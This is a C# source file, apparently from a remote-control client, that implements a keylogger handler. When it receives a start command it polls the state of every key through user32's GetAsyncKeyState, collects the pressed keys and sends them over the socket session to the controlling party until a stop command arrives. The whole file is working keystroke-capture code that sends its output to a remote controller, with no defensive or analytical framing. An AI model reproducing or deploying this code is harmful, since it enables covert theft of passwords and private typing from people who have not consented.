using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using RemoteControl.Protocals;
using RemoteControl.Protocals.Request;
using RemoteControl.Protocals.Response;

namespace RemoteControl.Client.Handlers
{
    class RequestKeyloggerHandler : AbstractRequestHandler
    {
        private bool _isRunning = false;
        private Thread _logThread = null;
        private StringBuilder _logBuffer = new StringBuilder();

        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(int vKey);

        public override void Handle(SocketSession session, ePacketType reqType, object reqObj)
        {
            if (reqType == ePacketType.PACKET_KEYLOGGER_START_REQUEST)
            {
                if (_isRunning) return;
                _isRunning = true;
                _logBuffer.Clear();

                _logThread = RunTaskThread(() =>
                {
                    while (_isRunning)
                    {
                        for (int i = 8; i <= 190; i++)
                        {
                            short state = GetAsyncKeyState(i);
                            if ((state & 0x0001) != 0)
                            {
                                string key = ((System.Windows.Forms.Keys)i).ToString();
                                _logBuffer.Append("[" + key + "]");
                            }
                        }

                        if (_logBuffer.Length > 0)
                        {
                            var resp = new ResponseKeylogger();
                            resp.Result = true;
                            resp.LogData = _logBuffer.ToString();
                            session.Send(ePacketType.PACKET_KEYLOGGER_RESPONSE, resp);
                            _logBuffer.Clear();
                        }

                        Thread.Sleep(50);
                    }
                });
            }
            else if (reqType == ePacketType.PACKET_KEYLOGGER_STOP_REQUEST)
            {
                _isRunning = false;
            }
        }
    }
}
